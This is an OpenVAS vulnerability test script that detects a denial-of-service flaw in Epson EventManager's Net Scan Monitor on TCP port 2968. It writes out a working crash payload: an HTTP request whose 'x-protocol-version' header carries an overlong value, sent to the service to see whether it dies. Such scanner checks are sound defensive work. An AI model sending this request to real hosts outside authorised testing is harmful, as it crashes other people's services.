###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_epson_event_manager_dos_vuln.nasl 11504 2018-09-20 12:55:48Z cfischer $
#
# Epson EventManager 'x-protocol-version' Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902824");
  script_version("$Revision: 11504 $");
  script_bugtraq_id(52511);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-20 14:55:48 +0200 (Thu, 20 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-03-28 15:15:15 +0530 (Wed, 28 Mar 2012)");
  script_name("Epson EventManager 'x-protocol-version' Denial of Service Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/48382");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/74033");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18602");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/48382");
  script_xref(name:"URL", value:"http://aluigi.org/adv/eeventmanager_1-adv.txt");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Denial of Service");
  script_require_ports(2968);
  script_dependencies("find_service.nasl");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
  application to crash, creating a denial of service condition.");

  script_tag(name:"affected", value:"Epson EventManager 2.50 and prior");

  script_tag(name:"insight", value:"The flaw is caused  due to an error in the Net Scan Monitor
  component when handling HTTP requests. This can be exploited to cause a crash
  via a specially crafted request sent to TCP port 2968.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Epson EventManager and is prone to denial of
  service vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");

port = 2968;
if(!get_port_state(port)){
  exit(0);
}

req1 = string( 'GET / HTTP/1.1\r\n',
               'x-uid: 0000000000000000000\r\n',
               'x-protocol-version : 1.00\r\n',
               'x-protocol-name: Epson Network Service Protocol\r\n\r\n' );
res = http_send_recv(port:port, data:req1);

if(!res || "Server : Epson Net Scan Monitor" >!< res){
  exit(0);
}

req2 = ereg_replace(pattern:"x-protocol-version : 1.00", string: req1,
       replace: "x-protocol-version: 1.000000000000000000000000000000");

res = http_send_recv(port:port, data:req2);
res = http_send_recv(port:port, data:req2);

sleep(3);

if(!res)
{
  res = http_send_recv(port:port, data:req1);
  if(!res){
    security_message(port);
  }
}

exit(0);
